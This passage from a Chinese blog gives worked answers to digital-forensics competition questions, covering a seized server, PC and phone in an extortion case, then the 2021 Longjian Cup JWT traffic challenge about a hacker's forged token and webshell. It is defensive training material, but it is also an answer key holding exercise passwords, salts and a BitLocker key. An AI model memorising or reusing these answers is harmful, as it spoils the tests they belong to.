<p>请分析当前宝塔面板密码加密过程中所使用的salt值为【区分大小写】</p>
</li>
<li>
<p>该值在这个位置看，default.db文件</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/www/server/panel/data</span><br></pre></td></tr></table></figure>
<ul>
<li>这里我一直在本地打开不了db文件，或者是打开的db文件有错误，所以就使用在线网站对db文件进行解析，最后得到<code>salt</code></li>
<li>所以最后的答案为：<code>v87ilhAVumZL</code></li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241021184102388.png" alt="image-20241021184102388"></p>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241021192535392.png" alt="image-20241021192535392"></p>
<h3 id="题目29"><a class="markdownIt-Anchor" href="#题目29"></a> 题目29</h3>
<ul>
<li>
<p>请分析该服务器，网站源代码所在的绝对路径为【标准格式/xxx/xxx/xxx】</p>
</li>
<li>
<p>使用<code>history</code>命令查看，发现有<code>/www/wwwroot/www.honglian7001/app</code></p>
</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241021184949336.png" alt="image-20241021184949336"></p>
<ul>
<li>
<p>所以最终答案为：<code>/www/wwwroot/www.honglian7001</code></p>
</li>
<li>
<p>网站目录使用宝塔也能一眼看到</p>
</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241021185328815.png" alt="image-20241021185328815"></p>
<h3 id="题目30"><a class="markdownIt-Anchor" href="#题目30"></a> 题目30</h3>
<ul>
<li>
<p>请分析，网站所使用的数据库位于IP为（）的服务器上（请使用该IP解压检材4，并重构网 站）【标准格式：111.111.111.111】</p>
</li>
<li>
<p>在该目录的文件下能看到数据库位于哪个ip的服务器上<code>/www/wwwroot/www.honglian7001/app/databae.php</code></p>
</li>
<li>
<p>所以最后答案为<code>192.168.110.115</code></p>
</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241021190152495.png" alt="image-20241021190152495"></p>
<h3 id="题目31"><a class="markdownIt-Anchor" href="#题目31"></a> 题目31</h3>
<ul>
<li>
<p>请分析，数据库的登陆密码为【区分大小写】</p>
</li>
<li>
<p>答案<code>wxrM5GtNXk5k5EPX</code></p>
</li>
<li>
<p>在上题的<code>.php</code>文件中就会出现数据库的登录密码</p>
</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241021190329549.png" alt="image-20241021190329549"></p>
<h3 id="题目32"><a class="markdownIt-Anchor" href="#题目32"></a> 题目32</h3>
<ul>
<li>
<p>请尝试重构该网站，并指出，该网站的后台管理界面的入口为【标准格式：/web】</p>
</li>
<li>
<p>后台登录的路口都在<code>admin</code>中，所以答案为<code>/admin</code></p>
</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241021193407015.png" alt="image-20241021193407015"></p>
<h3 id="题目33"><a class="markdownIt-Anchor" href="#题目33"></a> 题目33</h3>
<ul>
<li>
<p>已该涉案网站代码中对登录用户的密码做了加密处理。请找出加密算法中的salt值【区分大小写】</p>
</li>
<li>
<p>在该目录下的这个文件中就可以看到盐值</p>
</li>
<li>
<p>答案：<code>lshi4AsSUrUOwWV</code></p>
</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241021193102647.png" alt="image-20241021193102647"></p>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241021193126034.png" alt="image-20241021193126034"></p>
<h3 id="题目34"><a class="markdownIt-Anchor" href="#题目34"></a> 题目34*</h3>
<ul>
<li>请分析该网站的管理员用户的密码为</li>
</ul>
<h3 id="题目35"><a class="markdownIt-Anchor" href="#题目35"></a> 题目35*</h3>
<ul>
<li>在对后台账号的密码加密处理过程中，后台一共计算几次哈希值</li>
</ul>
<h3 id="题目36"><a class="markdownIt-Anchor" href="#题目36"></a> 题目36*</h3>
<ul>
<li>请统计，后台中，一共有多少条设备记录</li>
</ul>
<h3 id="题目37"><a class="markdownIt-Anchor" href="#题目37"></a> 题目37*</h3>
<ul>
<li>请通过后台确认，本案中受害者的手机号码为</li>
</ul>
<h3 id="题目38"><a class="markdownIt-Anchor" href="#题目38"></a> 题目38*</h3>
<ul>
<li>请分析，本案中受害者的通讯录一共有多少条记录</li>
</ul>
<h2 id="检材4"><a class="markdownIt-Anchor" href="#检材4"></a> 检材4</h2>
<h3 id="题目39"><a class="markdownIt-Anchor" href="#题目39"></a> 题目39</h3>
<ul>
<li>
<p>请计算检材四-PC的原始硬盘的SHA256值</p>
</li>
<li>
<p>思路和操作都是前面的，这里不多说，答案：<code>E9ABE6C8A51A633F809A3B9FE5CE80574AED133BC165B5E1B93109901BB94C2B </code></p>
</li>
</ul>
<h3 id="题目40"><a class="markdownIt-Anchor" href="#题目40"></a> 题目40</h3>
<ul>
<li>
<p>请分析，检材四-PC的Bitlocker加密分区的解密密钥为</p>
</li>
<li>
<p>直接美亚取证大师，一键找出，答案：<code>511126-518936-161612-135234-698357-082929-144705-622578</code></p>
</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241021195227242.png" alt="image-20241021195227242"></p>
<h3 id="题目41"><a class="markdownIt-Anchor" href="#题目41"></a> 题目41</h3>
<ul>
<li>
<p>请分析，检材四-PC的开机密码为</p>
</li>
<li>
<p>答案：<code>12306</code></p>
</li>
<li>
<p>直接使用题目40的密钥解密</p>
</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241021195807808.png" alt="image-20241021195807808"></p>
<ul>
<li>解密后再次自动取证</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241021195927573.png" alt="image-20241021195927573"></p>
<ul>
<li>找到用户信息</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241021200302719.png" alt="image-20241021200302719"></p>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241021201313690.png" alt="image-20241021201313690"></p>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241021201323019.png" alt="image-20241021201323019"></p>
<h3 id="题目42"><a class="markdownIt-Anchor" href="#题目42"></a> 题目42</h3>
<ul>
<li>经分析发现，检材四-PC是嫌疑人用于管理服务器的设备，其主要通过哪个浏览器控制网站后台</li>
<li>答案：<code>Google Chrome</code>
<ul>
<li>看下图谷歌是嫌疑人常用浏览器</li>
</ul>
</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241021201955425.png" alt="image-20241021201955425"></p>
<h3 id="题目43"><a class="markdownIt-Anchor" href="#题目43"></a> 题目43</h3>
<ul>
<li>
<p>请计算PC检材中用户目录下的zip文件的sha256值</p>
</li>
<li>
<p>直接美亚取证大师计算sha256</p>
</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241021202839521.png" alt="image-20241021202839521"></p>
<ul>
<li>答案：<code>0DD2C00C8C6DBDEA123373F91A3234D2F07D958355F6CD7126E397E12E8ADBB3</code></li>
</ul>
<h3 id="题目44"><a class="markdownIt-Anchor" href="#题目44"></a> 题目44</h3>
<ul>
<li>请分析检材四-phone，该手机的IMEI号为</li>
<li>答案为IMEI1：<code>868668043754436</code></li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241028083101054.png" alt="image-20241028083101054"></p>
<h3 id="题目45"><a class="markdownIt-Anchor" href="#题目45"></a> 题目45</h3>
<ul>
<li>请分析检材四-phone，嫌疑人和本案受害者是通过什么软件开始接触的【标准格式：支付宝 】</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241028083326102.png" alt="image-20241028083326102"></p>
<h3 id="题目46"><a class="markdownIt-Anchor" href="#题目46"></a> 题目46</h3>
<ul>
<li>请分析检材四-phone，受害者下载恶意APK安装包的地址为</li>
<li>答案：<code>https://cowtransfer.com/s/a6b28b4818904c</code></li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241028084023327.png" alt="image-20241028084023327"></p>
<h3 id="题目47"><a class="markdownIt-Anchor" href="#题目47"></a> 题目47</h3>
<ul>
<li>请分析检材四-phone，受害者的微信内部ID号为<code>wxid_op8i06j0aano22</code></li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241028084401908.png" alt="image-20241028084401908"></p>
<h3 id="题目48"><a class="markdownIt-Anchor" href="#题目48"></a> 题目48</h3>
<ul>
<li>请分析检材四-phone，嫌疑人用于敲诈本案受害者的QQ账号为<code>1649840939</code></li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241028084457608.png" alt="image-20241028084457608"></p>
<h3 id="题目49"><a class="markdownIt-Anchor" href="#题目49"></a> 题目49</h3>
<ul>
<li>请综合分析，嫌疑人用于管理敲诈对象的容器文件的SHA256值为</li>
<li>先对E1文件取证，找到密钥<code>3BC73D1D-E5B0-4592-B9D6-42D0A306B625</code></li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241028092358970.png" alt="image-20241028092358970"></p>
<ul>
<li>打开对应虚拟机,同时找到登录密码</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241028093118481.png" alt="image-20241028093118481"></p>
<ul>
<li>直接仿真打开电脑，找到该压缩包我的赚钱工具，然后进行解压缩，压缩密码<code>12306</code>，可以在取证软件中导出压缩包，然后再宿主机上进行解压缩</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241028115938582.png" alt="image-20241028115938582"></p>
<ul>
<li>解压后就会出现该vm文件</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241028124410441.png" alt="image-20241028124410441"></p>
<ul>
<li>使用仿真软件仿真该文件</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241028124444088.png" alt="image-20241028124444088"></p>
<ul>
<li>直接取证得到该密码，或者是仿真得到密码（我用仿真得到密码），然后再使用ubuntu打开<code>windos 10 x64.vmx</code>文件，发现有快照直接回到快照那边去</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241028124509090.png" alt="image-20241028124509090"></p>
<ul>
<li>取证中导出该文件<code>key.rar</code></li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241028125543598.png" alt="image-20241028125543598"></p>
<ul>
<li>找到这个，计算sha256，即可得到本题答案，本题答案为：<code>9C4BE29EB5661E6EDD88A364ECC6EF004C15D61B08BD7DD0A393340180F15608</code></li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241028125630125.png" alt="image-20241028125630125"></p>
<h3 id="题目50"><a class="markdownIt-Anchor" href="#题目50"></a> 题目50</h3>
<ul>
<li>
<p>请综合分析嫌疑人检材，另外一受害者“郭先生”的手机号码为</p>
</li>
<li>
<p>上题题目既然是容器文件那么就使用容器解密，猜测密钥就是<code>key.rar</code>（该压缩包本身就是做密钥）</p>
</li>
<li>
<p>挂载后就会出现如下内容</p>
</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241028130217413.png" alt="image-20241028130217413"></p>
<ul>
<li>找到郭先生的文件夹，得到电话<code>15266668888</code></li>
</ul>
<p><strong><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241028130305574.png" alt="image-20241028130305574"></strong></p>
<h3 id="题目51"><a class="markdownIt-Anchor" href="#题目51"></a> 题目51</h3>
<ul>
<li>
<p>通过嫌疑人检材，其中记录了几位受害者的信息</p>
</li>
<li>
<p>答案：<code>5</code></p>
</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241028165503088.png" alt="image-20241028165503088"></p>
<h3 id="题目52"><a class="markdownIt-Anchor" href="#题目52"></a> 题目52</h3>
<ul>
<li>
<p>请使用第11题的密码解压“金先生转账.zip”文件，并对压缩包中的文件计算SHA256值</p>
</li>
<li>
<p>答案：<code>cd62a83690a53e5b441838bc55ab83be92ff5ed26ec646d43911f119c15df510</code></p>
</li>
<li>
<p>在这个位置找到金先生转账</p>
</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241028170822623.png" alt="image-20241028170822623"></p>
<ul>
<li>
<p>由于之前11题没有写出来，导致解压密码不知道所以，先看wp得到解压密码<code>c74d97b01eae257e44aa9d5bade97baf</code></p>
</li>
<li>
<p>解压后直接sha256计算即可</p>
</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241028171259105.png" alt="image-20241028171259105"></p>
<h3 id="题目53"><a class="markdownIt-Anchor" href="#题目53"></a> 题目53</h3>
<ul>
<li>
<p>请综合分析，受害者一共被嫌疑人敲诈了多少钱（转账截图被隐藏在多个地方）</p>
</li>
<li>
<p>第一处52题的金先生转账</p>
</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241028171342681.png" alt="image-20241028171342681"></p>
<ul>
<li>第2处在伊对的聊天记录里面</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241028171750061.png" alt="image-20241028171750061"></p>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241028171800950.png" alt="image-20241028171800950"></p>
<ul>
<li>第3处在QQ聊天这边</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241028172545565.png" alt="image-20241028172545565"></p>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241028172050134.png" alt="image-20241028172050134"></p>
<ul>
<li>第4处微信这边又转了2000</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241028172320544.png" alt="image-20241028172320544"></p>
<h1 id="2021陇剑杯"><a class="markdownIt-Anchor" href="#2021陇剑杯"></a> 2021陇剑杯</h1>
<h2 id="jwt"><a class="markdownIt-Anchor" href="#jwt"></a> jwt</h2>
<ul>
<li>先了解一下jwt，jwt英文全称为<code>JWT（JSON Web Token）</code>，是一种常见的令牌格式
<ul>
<li>jwt存在于http协议中</li>
<li>jwt的一般格式为<code>header.payload.signature</code></li>
<li>jwt出现的位值
<ul>
<li>jwt会出现在cookie中</li>
<li>jwt还会出现在<code>url</code>中，但是这种方式不太安全</li>
<li>jwt还会出现在http的请求头中，一般在<code>Authorization</code>头，通常会以<code>Bearer</code>开头传递JWT令牌。</li>
</ul>
</li>
</ul>
</li>
<li>jwt的明文形式，首先我们了解了jwt的密文格式为<code>header.payload.signature</code>,现在了解一下jwt的明文格式</li>
</ul>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">对于头部`header`</span><br><span class="line">&#123;</span><br><span class="line">  &quot;alg&quot;: &quot;HS256&quot;, // 签名算法，例如 HMAC SHA256</span><br><span class="line">  &quot;typ&quot;: &quot;JWT&quot;    // 表示这是一个 JWT 令牌</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">对于载荷`payload`部分</span><br><span class="line">&#123;</span><br><span class="line">  &quot;sub&quot;: &quot;1234567890&quot;, // 用户的唯一标识</span><br><span class="line">  &quot;name&quot;: &quot;John Doe&quot;,</span><br><span class="line">  &quot;admin&quot;: true,       // 自定义字段，可以是用户角色、权限等</span><br><span class="line">  &quot;iat&quot;: 1516239022    // 签发时间，通常是一个 Unix 时间戳</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">对于签名`signature`部分</span><br><span class="line"></span><br><span class="line">HMACSHA256(</span><br><span class="line">    base64UrlEncode(header) + &quot;.&quot; + base64UrlEncode(payload),</span><br><span class="line">    secret</span><br><span class="line">)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>注意：从明文形式看前俩段都是没有加密的，都是经过base64编码后的，而最后一部分签名是与前俩部分有关系的</p>
<h3 id="题目1-jwt1"><a class="markdownIt-Anchor" href="#题目1-jwt1"></a> 题目1 jwt1</h3>
<ul>
<li>
<p>对流量抓包要分清楚用户的请求协议还是服务器的发送协议</p>
<ul>
<li>用户请求协议一般都有get或者post头</li>
<li>当用户的请求协议被服务器接收服务器会返回状态码</li>
<li>该题主要是黑客进行攻击，所以我们主要是把协议聚焦在请求协议上</li>
</ul>
</li>
<li>
<p>昨天，单位流量系统捕获了⿊客攻击流量，请您分析流量后进⾏回答：该⽹站使⽤了( )认证方式？(如有字母则默认小写)注意：此附件适用于jwt所有系列</p>
</li>
<li>
<p>打开流量包附件后直接看http协议，发现Cookie中的token是jwt的格式，所以最后答案为：<code>jwt</code></p>
</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241028191023377.png" alt="image-20241028191023377"></p>
<h3 id="题目2-jwt2"><a class="markdownIt-Anchor" href="#题目2-jwt2"></a> 题目2 jwt2</h3>
<ul>
<li>
<p>黑客绕过验证使用的jwt中，id和username是___。（中间使用#号隔开，例如1#admin）</p>
</li>
<li>
<p>答案：<code>10086#admin</code></p>
</li>
<li>
<p>了解了jwt基本格式后就，就直接复制http协议中的<code>token</code>的内容</p>
</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241028192001157.png" alt="image-20241028192001157"></p>
<ul>
<li>然后使用在线base64解密即可得到<code>id</code>和<code>username</code></li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241028192058734.png" alt="image-20241028192058734"></p>
<h3 id="题目3-jwt3"><a class="markdownIt-Anchor" href="#题目3-jwt3"></a> 题目3 jwt3</h3>
<ul>
<li>
<p>黑客获取webshell之后，权限是___？(字母默认小写)</p>
</li>
<li>
<p>答案：<code>root</code></p>
</li>
<li>
<p>通过流量分析可以看到root权限和对应的密码</p>
</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241028192459251.png" alt="image-20241028192459251"></p>
<ul>
<li>并且在分析流量包的内容时还发现了<code>whoami</code>命令</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241028192637308.png" alt="image-20241028192637308"></p>
<ul>
<li>之后就出现了<code>root</code></li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241028192700458.png" alt="image-20241028192700458"></p>
<h3 id="题目4-jwt4"><a class="markdownIt-Anchor" href="#题目4-jwt4"></a> 题目4 jwt4</h3>
<ul>
<li>黑客上传的恶意文件文件名是___。(请提交带有文件后缀的文件名，例如x.txt)</li>
<li>答案：<code>1.c</code></li>
<li>通过逐步分析http协议，就可以看到，黑客使用命令执行，将码一步步写入被攻击的计算机中，使用的是<code>echo 命令</code></li>
<li>然后解密</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241028193743264.png" alt="image-20241028193743264"></p>
<ul>
<li>最后这个马会被写入<code>/tmp</code>文件夹下的<code>1.c</code>文件中</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241028193956889.png" alt="image-20241028193956889"></p>
<h3 id="题目5-jwt5"><a class="markdownIt-Anchor" href="#题目5-jwt5"></a> 题目5 jwt5</h3>
<ul>
<li>黑客在服务器上编译的恶意so文件，文件名是___。(请提交带有文件后缀的文件名，<a target="_blank" rel="noopener" href="http://xn--x-kb7av23a.so">例如x.so</a>)</li>
<li>答案：<code>looter.so</code></li>
<li>在查看接下去的http协议，会发现又有命令执行，</li>
</ul>
